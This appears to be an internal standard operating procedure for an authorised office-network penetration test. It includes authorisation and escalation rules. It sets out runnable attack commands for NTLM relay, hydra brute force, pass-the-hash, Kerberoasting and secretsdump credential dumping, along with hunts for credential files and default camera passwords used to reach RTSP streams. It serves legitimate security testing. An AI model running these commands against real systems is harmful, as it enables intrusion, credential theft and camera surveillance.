# SHOWDOWN — Standard Operating Procedure
## Office Network Penetration Test

> **AUTHORISATION REQUIRED.** Do not begin any phase without written permission
> from the client. Keep a signed copy of the Rules of Engagement (RoE) available
> at all times during testing.

---

## 0. Pre-Engagement Checklist

Before starting the framework:

| Item | Detail | Confirmed |
|------|--------|-----------|
| Written authorisation | Signed statement permitting testing of defined scope | ☐ |
| Scope definition | IP ranges, domains, excluded hosts | ☐ |
| Rules of Engagement | What is allowed (brute force? DoS? Social eng?) | ☐ |
| Account lockout policy | Max auth attempts before lockout | ☐ |
| Emergency contact | Client IT/Security contact for unexpected incidents | ☐ |
| Pentest window | Start/end times, any blackout periods | ☐ |
| Report format | Client's preferred report format and confidentiality | ☐ |

```
Emergency stop: inform client contact immediately if you cause disruption
Incident response: if you detect a real breach (not yours), report it
```

---

## 1. Setup

### 1.1 Prepare Target File

Create `targets.txt` in the project directory. One entry per line.

```
# Client: Acme Corp Office Network
# Engagement: Internal Pentest
# Date: 2026-03-01
# Scope confirmed by: [Client Name, Date]

192.168.10.0/24
192.168.20.0/24
10.0.0.1
10.0.0.50
# 10.0.0.100  <-- excluded: critical production server
```

Rules:
- `#` lines are ignored
- CIDR ranges, individual IPs, and nmap-style ranges (10.0.0.1-50) all work
- Comment why anything is excluded

### 1.2 Install Dependencies

```bash
sudo ./install_deps.sh
```

Tools installed:
- **Recon**: nmap, masscan, whois, dig, dnsrecon, theHarvester, shodan
- **Web**: nikto, gobuster, feroxbuster, ffuf, whatweb, wpscan, sslscan, nuclei
- **SMB**: smbclient, smbmap, enum4linux-ng, crackmapexec
- **Brute force**: hydra, medusa
- **Post-exploit**: impacket suite (secretsdump, psexec, wmiexec, etc.)
- **Lateral movement**: responder, bloodhound-python
- **Cracking**: hashcat, john

### 1.3 Launch

```bash
# Assisted mode (recommended for most engagements)
./showdown.sh -t targets.txt

# Manual — pick specific modules
./showdown.sh -t targets.txt -m manual

# Auto pipeline (no prompts — use for known-clean networks only)
./showdown.sh -t targets.txt -m auto -s client_name

# With custom session name
./showdown.sh -t targets.txt -s "acme_internal_march2026"
```

Session output appears in `sessions/acme_internal_march2026_TIMESTAMP/`.

---

## 2. Phase 0 — Reconnaissance

### 2.1 Passive Recon (No Target Contact)

**When to use:** Always. Run before anything active. Essential on stealth engagements.

**Tools and what they do:**

| Tool | What it finds |
|------|---------------|
| `whois` | Domain registrar, registrant, name servers, IP block owner |
| `dig` (A/MX/NS/TXT/AXFR) | DNS records; AXFR = zone transfer (huge misconfiguration if open) |
| `dnsrecon` | Comprehensive DNS: standard, brute-force subdomains, zone transfers |
| `theHarvester` | OSINT: emails, subdomains, IPs from Google/Bing/LinkedIn |
| `curl crt.sh` | Certificate transparency logs — reveals subdomains from SSL certs |
| `shodan` | Internet-facing device database — shows open ports, banners, CVEs |

**Key finding to look for:**
- Zone transfer (AXFR) success → all DNS data leaked
- Shodan showing internal services exposed to internet
- Emails harvested → useful for phishing (if in scope)
- Subdomains not in scope → flag, may need scope extension

**Output:** `sessions/*/recon/`

---

### 2.2 Active Recon (Sends Packets)

**When to use:** After passive recon. Confirms which IPs are live before deeper scanning.

| Tool | Method | Notes |
|------|--------|-------|
| `nmap -sn` | ICMP + TCP SYN/ACK ping | Most reliable general-purpose discovery |
| `arp-scan` | ARP broadcast (LAN only) | Cannot be blocked by host firewall |
| `netdiscover` | Active + passive ARP | Good for LAN subnets |
| `fping` | Parallel ICMP | Fastest for large ranges |
| `nbtscan` | NetBIOS queries | Finds Windows hosts, reveals hostnames |

**Output:** `sessions/*/recon/hosts_alive.txt`

---

## 3. Phase 1 — Port Scanning

### 3.1 TCP Port Scanning

**Always run against alive hosts list, not full scope.**

| Profile | Command flags | Use case |
|---------|--------------|----------|
| Quick | `-sS -T4 --top-1000` | Time-limited engagement |
| Standard | `-sS -sV -sC -T4 --top-1000` | Most engagements (recommended) |
| Full | `-sS -sV -sC -p-` | Thorough — finds services on non-standard ports |
| Stealth | `-sS -O -T2` | Monitored network, slow but quieter |

**Important service flags to note:**

| Port(s) | Service | Priority |
|---------|---------|----------|
| 21 | FTP | Check anonymous login |
| 22 | SSH | Brute force, key auth? |
| 23 | Telnet | **HIGH** — cleartext protocol |
| 25/587 | SMTP | Open relay, email enum |
| 80/443/8080/8443 | HTTP/S | Web enum module |
| 139/445 | SMB | **CRITICAL** — SMB module |
| 554/8554 | RTSP | Webcam module |
| 3389 | RDP | Brute force, BlueKeep |
| 5985/5986 | WinRM | PSRemoting with valid creds |
| 1433/3306/5432 | Database | Should not be exposed |
| 37777/34567 | DVR | Webcam module — Dahua/generic |
| 8000/8080 | IoT/Camera | Webcam module — Hikvision |

### 3.2 UDP Scanning (often skipped but valuable)

Top targets: DNS(53), SNMP(161), NTP(123), TFTP(69), SNMP Trap(162)

```bash
nmap -sU --top-ports 200 -T4 --open -iL hosts_alive.txt
```

SNMP default community strings are worth testing even if other paths are closed.

---

## 4. Phase 2 — Vulnerability Scanning

### 4.1 Nuclei

Template-based scanner — runs against all discovered hosts.

```
Recommended template sets:
  cves,misconfigurations,exposures,default-logins
```

Nuclei is fast and accurate. Update templates before each engagement:
```bash
nuclei -update-templates
```

### 4.2 Nmap `--script vuln`

Runs NSE vulnerability scripts. Key scripts in the vuln category:
- `smb-vuln-ms17-010` — EternalBlue
- `ssl-heartbleed` — OpenSSL Heartbleed
- `http-shellshock` — Shellshock
- `smb-vuln-ms08-067` — MS08-067 (old but still found)

### 4.3 Nikto

Web-specific. Checks for:
- Outdated server software
- Default files and directories
- Dangerous HTTP methods
- SSL certificate issues
- XSS and injection vectors in headers

### 4.4 searchsploit

Cross-references nmap XML against Exploit-DB offline:
```bash
searchsploit --nmap scan.xml
```

---

## 5. Phase 2B — Web Enumeration

### 5.1 Technology Fingerprinting

`whatweb -a 3` identifies: web server, CMS, language, framework, plugins.

Decide next steps based on what you find:
- WordPress → WPScan for plugin CVEs and user enumeration
- Joomla → joomscan
- Apache/Nginx → check version against CVE list
- PHP → check for version disclosure, path traversal

### 5.2 Directory Brute Force

**Feroxbuster** (recursive, recommended):
```bash
feroxbuster --url http://target --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Gobuster** (non-recursive):
```bash
gobuster dir -u http://target -w <wordlist> --threads 30
```

Priority paths to look for:
```
/admin, /administrator, /wp-admin, /phpmyadmin
/.git, /.env, /.htaccess
/api, /api/v1, /swagger, /swagger-ui
/backup, /bak, /old
/debug, /test, /dev, /staging
/robots.txt, /sitemap.xml, /crossdomain.xml
```

### 5.3 SSL/TLS

Use `sslscan` or `testssl.sh` to check for:
- Protocol: SSLv3, TLS 1.0/1.1 → downgrade attacks
- Weak ciphers: RC4, DES, 3DES, NULL, EXPORT
- Certificate: expired, self-signed, wrong hostname
- Heartbleed (OpenSSL ≤ 1.0.1f)
- BEAST, POODLE, DROWN

---

## 6. Phase 2C — Webcam / IoT Attacks

### 6.1 Discovery

Camera ports to scan:
```
TCP: 554, 8554, 10554  — RTSP streams
TCP: 80, 8080, 8443    — HTTP admin panels
TCP: 37777, 37778      — Dahua SDK
TCP: 34567, 9527       — Generic DVR
TCP: 8000              — Hikvision ISAPI
UDP: 3702              — ONVIF WS-Discovery
```

### 6.2 Identification

Check HTTP response headers and body for manufacturer fingerprints:
- `Server: Hikvision-Webs`
- `Server: Dahua`
- `/ISAPI/` — Hikvision
- `/RPC2_Login` — Dahua
- `/onvif/device_service` — any ONVIF camera

### 6.3 Default Credential Testing

Priority default credential pairs (most common in office deployments):

| Manufacturer | Username | Password |
|-------------|----------|----------|
| Hikvision | admin | 12345 |
| Dahua | admin | admin |
| Axis | root | pass / admin |
| Foscam | admin | (blank) |
| Generic DVR | admin | 1234 / 12345 |
| Generic | admin | admin / password |
| Bosch | admin | (blank) |

### 6.4 RTSP Stream Access

Test URL patterns:
```
rtsp://<ip>:554/
rtsp://<ip>:554/stream1
rtsp://<ip>:554/cam/realmonitor?channel=1&subtype=0   # Dahua
rtsp://<ip>:554/h264Preview_01_main                    # Hikvision
rtsp://<ip>:554/live.sdp                               # Generic
rtsp://<ip>:8554/live/ch00_0
```

Access without credentials first. If denied, try default creds in URL:
```
rtsp://admin:12345@<ip>:554/
```

Capture stream for evidence:
```bash
ffmpeg -rtsp_transport tcp -i "rtsp://admin:12345@192.168.1.100:554/stream1" \
    -frames:v 1 -q:v 2 camera_evidence.jpg 2>/dev/null
```

### 6.5 Known CVEs

| CVE | Affects | Impact |
|-----|---------|--------|
| CVE-2021-36260 | Hikvision (many models) | Unauthenticated RCE |
| CVE-2021-33044 | Dahua (many models) | Auth bypass |
| CVE-2018-9995 | Generic H.264 DVR | Credential disclosure via cookie |
| CVE-2018-10660 | Hikvision | RTSP auth bypass |
| CVE-2016-6914 | Netwave cameras | Credential disclosure |

---

## 7. Phase 3 — Exploitation

### 7.1 SMB Attacks (Windows Networks)

**Order of operations:**
1. `nmap --script smb-security-mode` — check signing
2. `enum4linux-ng -A` — full enumeration per host
3. `smbclient -L` / `smbmap` — null session and share access
4. Check for EternalBlue with `nmap --script smb-vuln-ms17-010`
5. If credentials available: CrackMapExec for spread

**SMB Signing Disabled:**
When SMB signing is not required, NTLM relay attacks are possible.
Combine with Responder to relay hashes instead of cracking them:
```bash
# Terminal 1: ntlmrelayx targeting a host
ntlmrelayx.py -tf targets.txt -smb2support

# Terminal 2: Responder (with SMB and HTTP off — ntlmrelayx handles them)
responder -I eth0 -w -d
```

### 7.2 Credential Brute Force

**Always confirm lockout policy first.**

Hydra cheatsheet:
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://192.168.1.1 -t 4

# HTTP Basic Auth
hydra -l admin -P pass.txt http-get://192.168.1.1/admin -t 4

# HTTP Form POST (login page)
hydra -l admin -P pass.txt 192.168.1.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# RDP
hydra -L users.txt -P pass.txt rdp://192.168.1.1 -t 1

# SMB
hydra -L users.txt -P pass.txt smb://192.168.1.1 -t 1
```

---

## 8. Phase 4 — Lateral Movement

### 8.1 LLMNR/NBT-NS Poisoning with Responder

**How it works:**
1. Windows host tries to resolve `\\fileserver` (which doesn't exist)
2. DNS fails → host broadcasts LLMNR query
3. Responder intercepts and responds "that's me"
4. Victim sends NTLMv2 challenge-response → we capture the hash

```bash
sudo responder -I eth0 -wrdf
```

Captured hashes: `/usr/share/responder/logs/`

Crack with hashcat:
```bash
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Best results:** Run during business hours when users are actively browsing network resources.

### 8.2 Pass-the-Hash

If you have an NTLM hash (not the plaintext), you can still authenticate:

```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NT_HASH>

# psexec
psexec.py Administrator@192.168.1.10 -hashes :NT_HASH

# wmiexec
wmiexec.py DOMAIN/Administrator@192.168.1.10 -hashes :NT_HASH
```

### 8.3 Kerberoasting

1. Get service ticket:
   ```bash
   GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request
   ```

2. Crack offline:
   ```bash
   hashcat -m 13100 kerberoast.txt rockyou.txt
   ```

3. Use cracked service account password for lateral movement

### 8.4 BloodHound Analysis

After collecting data:
1. Start Neo4j: `neo4j start`
2. Start BloodHound GUI
3. Upload `.zip` files from collection
4. Run key queries:
   - "Shortest Paths to Domain Admins"
   - "Find Principals with DCSync Rights"
   - "Computers where Domain Admins are Sessions"

---

## 9. Phase 5 — Post-Exploitation

### 9.1 Credential Dumping

**Remote SAM dump** (local accounts):
```bash
secretsdump.py DOMAIN/admin:password@192.168.1.10
```

**NTDS dump** (ALL domain accounts — requires DA):
```bash
secretsdump.py DOMAIN/admin:password@DC_IP -just-dc
```

**Extract NTLM hashes from output:**
```bash
grep -oP '[^:]+:[0-9]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::' dump.txt
```

Crack with:
```bash
hashcat -m 1000 ntlm_hashes.txt rockyou.txt  # NTLM
hashcat -m 3000 lm_hashes.txt rockyou.txt     # LM (old)
```

### 9.2 Sensitive File Hunting

**Windows shares** (via smbmap):
```bash
smbmap -H 192.168.1.10 -u user -p password -R -A "\.env|\.kdbx|password|config"
```

**Linux (if shell access)**:
```bash
find / \( -name "*.env" -o -name "config.php" -o -name "id_rsa" \) 2>/dev/null
grep -r "password=" /var/www/ /etc/ 2>/dev/null --include="*.conf" -l
```

**Windows (cmd)**:
```cmd
findstr /spin /c:"password" C:\*.txt C:\*.xml C:\*.config 2>nul
dir /s /b C:\*.kdbx C:\*.pfx C:\*.rdp 2>nul
cmdkey /list
```

---

## 10. Findings Classification

| Severity | Criteria | Example |
|----------|----------|---------|
| **CRITICAL** | Direct path to full compromise, no user interaction | EternalBlue RCE, default creds on admin panel, NTDS dump |
| **HIGH** | Significant risk, requires exploitation | SMB signing disabled, cleartext protocols, weak password policy |
| **MEDIUM** | Notable risk, requires additional steps | Outdated software versions, self-signed certs, excessive share permissions |
| **LOW** | Minor risk, defence in depth | Information disclosure, missing security headers |
| **INFO** | Informational, no direct risk | Open ports that are expected, technology fingerprinting |

---

## 11. Session Output Structure

```
sessions/<name>_<timestamp>/
├── findings.md          ← Auto-generated findings report (edit and expand)
├── showdown.log         ← Full command log with timestamps
├── targets.txt          ← Scope used for this session
├── recon/
│   ├── hosts_alive.txt  ← Confirmed live hosts (use for further phases)
│   ├── whois_*.txt
│   ├── dns_*.txt
│   ├── nmap_pingsweep.*
│   └── ...
├── scan/
│   ├── nmap_scan.{txt,xml,gnmap}
│   ├── nuclei_results.txt
│   └── nikto_*.txt
├── web/
│   ├── cameras/         ← Webcam/IoT findings
│   └── <host>:<port>/   ← Per web target results
├── exploit/
│   ├── smb/             ← SMB enumeration and attack output
│   └── brute/           ← Credential brute force results
├── lateral/
│   ├── responder_hashes.txt
│   ├── cme_lateral.txt
│   └── bloodhound/
├── post/
│   ├── creds/           ← Dumped credential files
│   ├── files/           ← Sensitive file discovery
│   └── ad/              ← AD enumeration
└── loot/
    ├── credentials.txt  ← All found credentials (live)
    ├── ntlm_hashes.txt  ← NTLM hashes for cracking
    ├── usernames.txt    ← All discovered usernames
    ├── camera_creds.txt ← Camera credentials and stream URLs
    └── rtsp_streams.txt ← Accessible RTSP stream URLs
```

---

## 12. Quick Reference — Tool Commands

### Nmap
```bash
nmap -sS -sV -sC -T4 -p- --open -oA scan target        # Full TCP
nmap -sU --top-ports 200 -T4 --open target              # UDP
nmap --script vuln -sV target                           # Vuln scripts
nmap --script smb-vuln-ms17-010 -p 445 target          # EternalBlue check
```

### CrackMapExec
```bash
cme smb targets.txt -u user -p pass                     # Auth check
cme smb targets.txt -u user -H HASH                     # Pass-the-Hash
cme smb targets.txt -u user -p pass --shares            # Share list
cme smb targets.txt -u user -p pass --sam               # SAM dump
cme smb targets.txt -u user -p pass -x "whoami"         # Run command
```

### Impacket
```bash
secretsdump.py domain/user:pass@ip                      # Cred dump
psexec.py domain/user:pass@ip                           # SYSTEM shell
wmiexec.py domain/user:pass@ip                          # WMI shell
GetUserSPNs.py domain/user:pass -dc-ip ip -request      # Kerberoast
GetNPUsers.py domain/ -usersfile users.txt -dc-ip ip    # AS-REP Roast
lookupsid.py user:pass@ip                               # RID cycle
```

### Hydra
```bash
hydra -L users.txt -P pass.txt ssh://ip -t 4            # SSH
hydra -L users.txt -P pass.txt smb://ip -t 1            # SMB
hydra -l admin -P pass.txt http-get://ip/admin          # HTTP Basic
```

### hashcat
```bash
hashcat -m 1000  hashes.txt wordlist.txt    # NTLM
hashcat -m 5600  hashes.txt wordlist.txt    # NTLMv2
hashcat -m 13100 hashes.txt wordlist.txt    # Kerberos TGS
hashcat -m 18200 hashes.txt wordlist.txt    # AS-REP
hashcat -m 1000  hashes.txt --show          # Show cracked
```

---

## 13. Escalation & Communication

| Event | Action |
|-------|--------|
| Access to production data | Stop immediately, notify client emergency contact |
| Evidence of real attacker / breach | Stop, preserve logs, notify client immediately |
| Service disruption caused by test | Notify client, document, do not retry |
| Scope unclear | Stop, contact client for clarification |
| Requesting scope extension | Written approval required before expanding |

---

*SHOWDOWN Framework — Maintained internally. Update SOP after each engagement.*
